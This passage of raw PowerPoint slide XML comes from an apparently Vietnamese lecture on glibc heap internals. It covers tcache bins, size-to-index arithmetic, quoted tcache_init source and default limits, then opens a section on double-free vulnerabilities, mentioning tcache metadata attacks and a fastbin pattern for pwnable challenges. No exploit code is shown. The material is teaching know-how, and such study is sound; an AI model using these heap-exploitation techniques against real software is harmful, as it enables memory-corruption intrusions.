                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>next</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> trỏ chunk kế tiếp trong cùng bin; liên kết đơn vì tcache chỉ push/pop ở đầu</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1417320"/>
            <a:ext cx="5522976" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="1600200"/>
            <a:ext cx="5120640" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>64-BIT: MINSIZE 0x20 · ALIGN 16 · SIZE_SZ 8</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="2011680"/>
            <a:ext cx="5120640" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>0x100 → idx 14</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="3108960"/>
            <a:ext cx="5120640" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>(256 − 32 + 15) / 16 = 14</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="4389120"/>
            <a:ext cx="5522976" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="455371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CHIỀU NGƯỢC LẠI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="4846320"/>
            <a:ext cx="5157216"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tidx2usize(14) = 14×16 + 32 − 8 = 248</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="5303520"/>
            <a:ext cx="5157216" cy="804672"/>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Khớp đúng </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>BUFSIZE2 = 248</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> trong ví dụ 5.5: mọi </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>malloc(248)</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> quy về cùng </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>entries[14]</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</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tcache_init(): tcache cũng là một chunk heap</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4-f,g,h · malloc.c:2977–3002</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5760720" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="5394960" cy="4572000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t># define MAYBE_INIT_TCACHE()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if (__glibc_unlikely (tcache == NULL))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tcache_init();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static void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tcache_init (void)</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mstate ar_ptr;</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const size_t bytes = sizeof (tcache_perthread_struct);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b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  arena_get (ar_ptr, bytes);   /* khóa arena 1 lần */</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  void *victim = _int_malloc (ar_ptr, bytes);</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if (ar_ptr != NULL)</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__libc_lock_unlock (ar_ptr-&gt;mutex);</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if (victim)</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tcache = (tcache_perthread_struct *) victim;</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memset (tcache, 0, sizeof (tcache_perthread_struct));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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="1417320"/>
            <a:ext cx="5285232" cy="1783080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4103"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6629400" y="1581912"/>
            <a:ext cx="491947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KHỞI TẠO LƯỜI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6629400" y="1874520"/>
            <a:ext cx="4919472" cy="1216152"/>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chemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cấp phát một lần mỗi thread, ở lần </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>malloc()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> đầu tiên</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Khóa arena chỉ trả giá lúc khởi tạo; tcache_put/get sau đó không lock</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tcache là trạm dừng đầu: bin đầy hoặc chunk quá lớn mới xuống fastbin/unsorted</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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446520" y="3383280"/>
          <a:ext cx="5285232" cy="914400"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="2057400"/>
                <a:gridCol w="1005840"/>
                <a:gridCol w="2221992"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Hằng số</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Mặc định</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Ý nghĩa</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r>
              <a:tr h="0">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TCACHE_MAX_BINS</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64</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số size class quản lý</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TCACHE_FILL_COUNT</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7</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chunk tối đa mỗi bin</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tcache_max_bytes</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1032 B</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request lớn hơn không qua tcache</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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="4937760"/>
            <a:ext cx="5285232" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5714"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6629400" y="5102352"/>
            <a:ext cx="491947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HỆ QUẢ CHO PWNABLE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6629400" y="5394960"/>
            <a:ext cx="4919472" cy="71323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Binary đơn giản: đây thường là chunk heap đầu tiên, tiền đề của tcache metadata attack (6.3). Ba giới hạn trên là tunable.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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31520" y="640080"/>
            <a:ext cx="4572000" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="14000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="100" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="3063240"/>
            <a:ext cx="6949440" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lỗ hổng Double Free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="body" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4343400"/>
            <a:ext cx="6949440" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Yêu cầu 1, 2, 3 · khái niệm, CWE, vị trí lỗi trong source glibc và PoC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="914400"/>
            <a:ext cx="3593592" cy="5120640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2036"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1143000"/>
            <a:ext cx="3108960" cy="27432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NỘI DUNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1554480"/>
            <a:ext cx="3154680" cy="4297680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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5    Bản chất</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5.1  free/malloc trong glibc</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5.2  Điều kiện phát sinh</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5.3  CWE</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5.4  Theo phiên bản glibc</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5.5  Ví dụ &amp; 2 sink</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Double free: free() hai lần cùng một vùng nhớ</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1 · KHÁI NIỆM VÀ NGUYÊN LÝ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5522976" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="158191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BẢN CHẤT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1874520"/>
            <a:ext cx="5157216" cy="1719072"/>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bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Gọi </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> nhiều lần trên cùng vùng nhớ là undefined behavior</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chunk bị chèn hai lần vào cùng tcache/fastbin, phá linked list allocator dùng để tái sử dụng chunk</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Đường khai thác phụ thuộc phiên bản glibc, loại bin, kích thước chunk</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1417320"/>
            <a:ext cx="5522976" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="1581912"/>
            <a:ext cx="5120640" cy="22860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MẪU KINH ĐIỂN TRÊN FASTBIN (GLIBC CŨ)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
